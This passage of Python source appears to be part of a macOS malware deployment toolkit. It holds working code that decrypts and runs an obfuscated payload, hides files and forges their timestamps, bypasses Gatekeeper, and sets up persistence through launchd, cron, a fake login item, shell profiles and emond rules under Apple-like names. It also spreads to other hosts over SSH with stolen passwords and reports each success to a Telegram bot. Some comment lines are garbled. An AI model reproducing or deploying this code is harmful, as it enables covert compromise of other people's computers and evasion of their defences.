for ((i=0;$(echo -n "$PAYLOAD" | wc -c); i++)); do
    CHAR="${{PAYLOAD:$i:1}}"
    BYTE=$(printf "%d" "'$CHAR")
    KEY_BYTE=$((0x${{KEY:$((i*2)):2}}))
    DEC_BYTE=$((BYTE ^ KEY_BYTE))
    DECRYPTED="$DECRYPTED$(printf "\\\\x%02x" $DEC_BYTE)"
done

Write to temp file
TEMP_FILE="$(mktemp /tmp/.X11-unix.XXXXXX)"
echo -ne "$DECRYPTED" > "$TEMP_FILE"
chmod +x "$TEMP_FILE"

Execute
"$TEMP_FILE" &
rm -f "$TEMP_FILE"

exit 0

"""

Write stub + obfuscated data
            with open(file_path, 'wb') as f:
                f.write(stub.encode())
                f.write(obfuscated)

Make executable
            os.chmod(file_path, 0o755)

            logger.debug(f"Payload obfuscated: {file_path}", module="macos_deploy")

        except Exception as e:
            logger.error(f"Payload obfuscation error: {e}", module="macos_deploy")

    def _hide_file(self, file_path: str):
        """Hide file using extended attributes"""
        try:
Add dot prefix to filename
            dir_name = os.path.dirname(file_path)
            base_name = os.path.basename(file_path)

            if not base_name.startswith('.'):
                hidden_path = os.path.join(dir_name, f".{base_name}")
                shutil.move(file_path, hidden_path)
                self.payload_path = hidden_path
                file_path = hidden_path

Set hidden flag using chflags
            subprocess.run(f'chflags hidden "{file_path}"', shell=True, capture_output=True)

Set extended attribute
            subprocess.run(f'xattr -w com.apple.FinderInfo "0000000000000000001000000000000000000000000000000000000000000000" "{file_path}"',
                         shell=True, capture_output=True)

            logger.debug(f"File hidden: {file_path}", module="macos_deploy")

        except Exception as e:
            logger.error(f"File hiding error: {e}", module="macos_deploy")

    def _set_file_attributes(self, file_path: str):
        """Set file attributes to look legitimate"""
        try:
Get original timestamp from legitimate system file
            system_files = ['/usr/bin/python', '/bin/bash', '/usr/libexec/xpcproxy']
            for sys_file in system_files:
                if os.path.exists(sys_file):
                    stat = os.stat(sys_file)
                    os.utime(file_path, (stat.st_atime, stat.st_mtime))
                    break

Set ownership to root if we're root
            if self.system_info['is_root']:
                subprocess.run(f'chown root:wheel "{file_path}"', shell=True, capture_output=True)

            logger.debug(f"File attributes set: {file_path}", module="macos_deploy")

        except Exception as e:
            logger.error(f"File attribute setting error: {e}", module="macos_deploy")

    def _bypass_gatekeeper(self, file_path: str):
        """Bypass Gatekeeper for deployed file"""
        try:
Remove quarantine attribute
            subprocess.run(f'xattr -d com.apple.quarantine "{file_path}"',
                         shell=True, capture_output=True)

Add to Gatekeeper exceptions
            subprocess.run(f'spctl --add "{file_path}"',
                         shell=True, capture_output=True)

            logger.debug(f"Gatekeeper bypassed for: {file_path}", module="macos_deploy")

        except Exception as e:
            logger.error(f"Gatekeeper bypass error: {e}", module="macos_deploy")

    def establish_persistence(self, methods: List[str] = None) -> Dict[str, bool]:
        """Establish persistence using multiple methods"""
        if methods is None:
            methods = ['launchd', 'cron', 'login_item', 'profile', 'emond']

        results = {}

        logger.info(f"Establishing persistence using {len(methods)} methods", module="macos_deploy")

        for method in methods:
            try:
                if method == 'launchd':
                    success = self._persist_via_launchd()
                elif method == 'cron':
                    success = self._persist_via_cron()
                elif method == 'login_item':
                    success = self._persist_via_login_item()
                elif method == 'profile':
                    success = self._persist_via_profile()
                elif method == 'emond':
                    success = self._persist_via_emond()
                elif method == 'kernel_extension':
                    success = self._persist_via_kext()
                else:
                    logger.warning(f"Unknown persistence method: {method}", module="macos_deploy")
                    success = False

                results[method] = success

                if success:
                    logger.info(f"Persistence established via {method}", module="macos_deploy")
                else:
                    logger.warning(f"Persistence failed via {method}", module="macos_deploy")

            except Exception as e:
                logger.error(f"Persistence error for {method}: {e}", module="macos_deploy")
                results[method] = False

Send Telegram notification
        successful = sum(1 for r in results.values() if r)
        total = len(results)

        self.send_telegram_notification(
            "Persistence Established",
            f"Host: {self.system_info['hostname']}\n"
            f"Methods: {successful}/{total} successful\n"
            f"Payload: {self.payload_path}"
        )

        return results

    def _persist_via_launchd(self) -> bool:
        """Establish persistence via launchd"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="macos_deploy")
                return False

Create launchd plist
            plist_name = 'com.apple.systemupdate'

            if self.system_info['is_root']:
                plist_dir = '/Library/LaunchDaemons'
            else:
                plist_dir = os.path.expanduser('~/Library/LaunchAgents')

            os.makedirs(plist_dir, exist_ok=True)
            plist_path = os.path.join(plist_dir, f'{plist_name}.plist')

Create plist content
            plist_content = {
                'Label': plist_name,
                'ProgramArguments': [self.payload_path],
                'RunAtLoad': True,
                'KeepAlive': True,
                'StartInterval': 60,
                'StandardErrorPath': '/dev/null',
                'StandardOutPath': '/dev/null'
            }

Write plist
            with open(plist_path, 'wb') as f:
                plistlib.dump(plist_content, f)

Load launchd job
            if self.system_info['is_root']:
                subprocess.run(f'launchctl load {plist_path}', shell=True, capture_output=True)
            else:
                subprocess.run(f'launchctl load {plist_path}', shell=True, capture_output=True)

            logger.debug(f"Launchd persistence set: {plist_path}", module="macos_deploy")
            return True

        except Exception as e:
            logger.error(f"Launchd persistence error: {e}", module="macos_deploy")
            return False

    def _persist_via_cron(self) -> bool:
        """Establish persistence via cron"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="macos_deploy")
                return False

Determine cron file based on user
            if self.system_info['is_root']:
                cron_file = '/etc/crontab'
                cron_line = f"* * * * * root {self.payload_path} >/dev/null 2>&1\n"
            else:
                cron_line = f"* * * * * {self.payload_path} >/dev/null 2>&1\n"

Add to user crontab
                result = subprocess.run(
                    'crontab -l 2>/dev/null',
                    shell=True,
                    capture_output=True,
                    text=True
                )

                current_cron = result.stdout
                new_cron = current_cron + cron_line if current_cron else cron_line

                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                    tmp.write(new_cron)
                    tmp_path = tmp.name

                subprocess.run(f'crontab {tmp_path}', shell=True)
                os.remove(tmp_path)

                logger.debug("Cron persistence set for user", module="macos_deploy")
                return True

For root, write to /etc/crontab
            with open(cron_file, 'a') as f:
                f.write(cron_line)

            logger.debug(f"Cron persistence set: {cron_file}", module="macos_deploy")
            return True

        except Exception as e:
            logger.error(f"Cron persistence error: {e}", module="macos_deploy")
            return False

    def _persist_via_login_item(self) -> bool:
        """Establish persistence via login items"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="macos_deploy")
                return False

Create .app bundle for login item
            app_name = 'SystemHelper.app'
            app_path = os.path.join(self.deploy_paths['user_applications'], app_name)

Create app bundle structure
            os.makedirs(os.path.join(app_path, 'Contents', 'MacOS'), exist_ok=True)
            os.makedirs(os.path.join(app_path, 'Contents', 'Resources'), exist_ok=True)

Create executable
            exec_path = os.path.join(app_path, 'Contents', 'MacOS', 'SystemHelper')
            shutil.copy2(self.payload_path, exec_path)
            os.chmod(exec_path, 0o755)

Create Info.plist
            info_plist = {
                'CFBundleExecutable': 'SystemHelper',
                'CFBundleIdentifier': 'com.apple.systemhelper',
                'CFBundleVersion': '1.0',
                'CFBundleName': 'System Helper',
                'LSUIElement': True  # No dock icon
            }

            with open(os.path.join(app_path, 'Contents', 'Info.plist'), 'wb') as f:
                plistlib.dump(info_plist, f)

Add to login items
            script = f'''
tell application "System Events"
    make login item at end with properties {{name:"SystemHelper", path:"{app_path}", hidden:true}}
end tell
'''

            subprocess.run(['osascript', '-e', script], capture_output=True)

            logger.debug(f"Login item created: {app_path}", module="macos_deploy")
            return True

        except Exception as e:
            logger.error(f"Login item persistence error: {e}", module="macos_deploy")
            return False

    def _persist_via_profile(self) -> bool:
        """Establish persistence via shell profiles"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="macos_deploy")
                return False

            profile_files = [
                os.path.expanduser('~/.bash_profile'),
                os.path.expanduser('~/.zshrc'),
                os.path.expanduser('~/.profile'),
                os.path.expanduser('~/.bashrc')
            ]

            success = False
            profile_line = f'\n# Start background process\n{self.payload_path} >/dev/null 2>&1 &\n'

            for profile_file in profile_files:
                if os.path.exists(profile_file) or profile_file.endswith('.bash_profile'):
                    with open(profile_file, 'a') as f:
                        f.write(profile_line)
                    success = True
                    logger.debug(f"Profile persistence set: {profile_file}", module="macos_deploy")

            return success

        except Exception as e:
            logger.error(f"Profile persistence error: {e}", module="macos_deploy")
            return False

    def _persist_via_emond(self) -> bool:
        """Establish persistence via emond (Event Monitor Daemon)"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="macos_deploy")
                return False

Only works with root
            if not self.system_info['is_root']:
                logger.warning("Root privileges required for emond persistence", module="macos_deploy")
                return False

Create emond rule
            rule_name = 'SystemMonitor'
            rule_dir = '/etc/emond.d/rules'
            os.makedirs(rule_dir, exist_ok=True)

            rule_path = os.path.join(rule_dir, f'{rule_name}.plist')

            rule_content = {
                'name': rule_name,
                'enabled': True,
                'events': [
                    {
                        'class': 'AppleEvent',
                        'attributes': {
                            'eventID': 'com.apple.iokit.matching'
                        }
                    }
                ],
                'actions': [
                    {
                        'command': self.payload_path,
                        'user': 'root'
                    }
                ]
            }

            with open(rule_path, 'wb') as f:
                plistlib.dump(rule_content, f)

Restart emond
            subprocess.run('launchctl kickstart -k system/com.apple.emond',
                         shell=True, capture_output=True)

            logger.debug(f"Emond persistence set: {rule_path}", module="macos_deploy")
            return True

        except Exception as e:
            logger.error(f"Emond persistence error: {e}", module="macos_deploy")
            return False

    def _persist_via_kext(self) -> bool:
        """Establish persistence via kernel extension"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="macos_deploy")
                return False

Only works with root and SIP disabled
            if not self.system_info['is_root']:
                logger.warning("Root privileges required for kext persistence", module="macos_deploy")
                return False

            if self.system_info['sip_status']:
                logger.warning("SIP must be disabled for kext persistence", module="macos_deploy")
                return False

            logger.warning("Kext persistence requires kernel extension development", module="macos_deploy")
            return False

        except Exception as e:
            logger.error(f"Kext persistence error: {e}", module="macos_deploy")
            return False

    def deploy_remote(self, target_host: str, payload_path: str,
                     credentials: Dict[str, str] = None) -> bool:
        """Deploy payload to remote macOS system"""
        try:
            logger.info(f"Attempting remote deployment to {target_host}", module="macos_deploy")

            if credentials:
                username = credentials.get('username')
                password = credentials.get('password')

Use SSH with password
                ssh_cmd = f"sshpass -p '{password}' scp {payload_path} {username}@{target_host}:/tmp/.update"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True)

                if result.returncode == 0:
Make executable and add to launchd
                    exec_cmd = f"sshpass -p '{password}' ssh {username}@{target_host} 'chmod +x /tmp/.update && launchctl bootstrap gui/$(id -u) /dev/stdin \"Labelcom.apple.systemupdateProgramstring>/tmp/.key>RunAttrue/>\"'"
                    subprocess.run(exec_cmd, shell=True, capture_output=True)
            else:
Try SSH with keys
                ssh_cmd = f"scp {payload_path} {target_host}:/tmp/.update"
                result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True)

                if result.returncode == 0:
Make executable and add to launchd
                    exec_cmd = f"ssh {target_host} 'chmod +x /tmp/.update && launchctl bootstrap gui/$(id -u) /dev/stdLabelcom.apple.systemupdateProgramstring>/tmp/.key>RunAttrue/>\"'"
                    subprocess.run(exec_cmd, shell=True, capture_output=True)

            if result.returncode == 0:
                self.send_telegram_notification(
                    "Remote Deployment Successful",
                    f"Target: {target_host}\n"
                    f"Payload: {os.path.basename(payload_path)}\n"
                    f"Method: SSH"
                )

                logger.info(f"Remote deployment successful to {target_host}", module="macos_deploy")
                return True
            else:
                logger.warning(f"Remote deployment failed to {target_host}: {result.stderr}", module="macos_deploy")
                return False

        except Exception as e:
            logger.error(f"Remote deployment error: {e}", module="macos_deploy")
            return False

    def cleanup(self, remove_payload: bool = True) -> bool:
        """Cleanup deployment artifacts"""
        try:
            cleanup_count = 0

Remove payload file
            if remove_payload and self.payload_path and os.path.exists(self.payload_path):
                try:
                    os.remove(self.payload_path)
                    cleanup_count += 1
                    logger.debug(f"Payload removed: {self.payload_path}", module="macos_deploy")
                except:
                    pass

Remove launchd plist
            plist_name = 'com.apple.systemupdate'

            if self.system_info['is_root']:
                plist_path = f'/Library/LaunchDaemons/{plist_name}.plist'
            else:
                plist_path = os.path.expanduser(f'~/Library/LaunchAgents/{plist_name}.plist')

            if os.path.exists(plist_path):
Unload first
                subprocess.run(f'launchctl remove {plist_name}', shell=True, capture_output=True)
                os.remove(plist_path)
                cleanup_count += 1

Remove cron entries
            if self.system_info['is_root']:
                cron_file = '/etc/crontab'
                if os.path.exists(cron_file):
                    with open(cron_file, 'r') as f:
                        lines = f.readlines()
                    with open(cron_file, 'w') as f:
                        for line in lines:
                            if self.payload_path not in line:
                                f.write(line)
                            else:
                                cleanup_count += 1
            else:
Remove user cron
                result = subprocess.run(
                    'crontab -l 2>/dev/null',
                    shell=True,
                    capture_output=True,
                    text=True
                )

                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    new_lines = [line for line in lines if self.payload_path not in line]

                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                        tmp.write('\n'.join(new_lines))
                        tmp_path = tmp.name

                    subprocess.run(f'crontab {tmp_path}', shell=True)
                    os.remove(tmp_path)
                    cleanup_count += 1

Remove login item
            app_path = os.path.join(self.deploy_paths['user_applications'], 'SystemHelper.app')
            if os.path.exists(app_path):
                shutil.rmtree(app_path)
                cleanup_count += 1

Remove from profiles
            profile_files = [
                os.path.expanduser('~/.bash_profile'),
                os.path.expanduser('~/.zshrc'),
                os.path.expanduser('~/.profile'),
                os.path.expanduser('~/.bashrc')
            ]

            for profile_file in profile_files:
                if os.path.exists(profile_file):
                    with open(profile_file, 'r') as f:
                        lines = f.readlines()
                    with open(profile_file, 'w') as f:
                        for line in lines:
                            if self.payload_path not in line:
                                f.write(line)
                            else:
                                cleanup_count += 1

            logger.info(f"Cleanup completed: {cleanup_count} artifacts removed", module="macos_deploy")
            return True

        except Exception as e:
            logger.error(f"Cleanup error: {e}", module="macos_deploy")
            return False

    def get_deployment_info(self) -> Dict[str, Any]:
        """Get deployment information"""
        return {
            'system_info': self.system_info,
            'payload_path': self.payload_path,
            'payload_hash': self.payload_hash,
            'deploy_paths': self.deploy_paths,
            'timestamp': datetime.now().isoformat()
        }

    def get_status(self) -> Dict[str, Any]:
        """Get deployer status"""
        return {
            'system': 'macOS',
            'version': self.system_info['macos_version'],
            'architecture': self.system_info['architecture'],
            'root': self.system_info['is_root'],
            'sip': self.system_info['sip_status'],
            'gatekeeper': self.system_info['gatekeeper_status'],
            'payload_deployed': self.payload_path is not None,
            'telegram_available': self.telegram_bot is not None
        }

Global instance
_macos_deployer = None

def get_macos_deployer(config: Dict = None) -> MacOSDeployer:
    """Get or create macOS deployer instance"""
    global _macos_deployer

    if _macos_deployer is None:
        _macos_deployer = MacOSDeployer(config)

    return _macos_deployer

if name == "main":
Test the macOS deployer
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'deploy_chat_id': 123456789
        }
    }

    deployer = get_macos_deployer(config)

    print("Testing macOS deployer...")
    print(f"macOS: {deployer.system_info['macos_version']}")
    print(f"Arch: {deployer.system_info['architecture']}")
    print(f"Root: {deployer.system_info['is_root']}")
    print(f"SIP: {deployer.system_info['sip_status']}")

Create test payload
    test_payload = os.path.join(tempfile.gettempdir(), 'test_payload.sh')
    with open(test_payload, 'w') as f:
        f.write('#!/bin/bash\necho "Test payload running"\nsleep 1\n')

    os.chmod(test_payload, 0o755)

Test deployment
    print("\nTesting payload deployment...")
    deployed = deployer.deploy_payload(test_payload, obfuscate=False, hide=False)
    print(f"Payload deployed: {deployed}")

    if deployed:
Test persistence
        print("\nTesting persistence methods...")
        persistence_results = deployer.establish_persistence(['launchd', 'cron'])
        print(f"Persistence results: {persistence_results}")

Get deployment info
    info = deployer.get_deployment_info()
    print(f"\nDeployment info: {info.get('payload_path')}")

Show status
    status = deployer.get_status()
    print(f"\n🍎 macOS Deployer Status: {status}")

Cleanup
    print("\nCleaning up...")
    deployer.cleanup()

Remove test payload
    if os.path.exists(test_payload):
        os.remove(test_payload)

    print("\n✅ macOS deployer tests completed!")
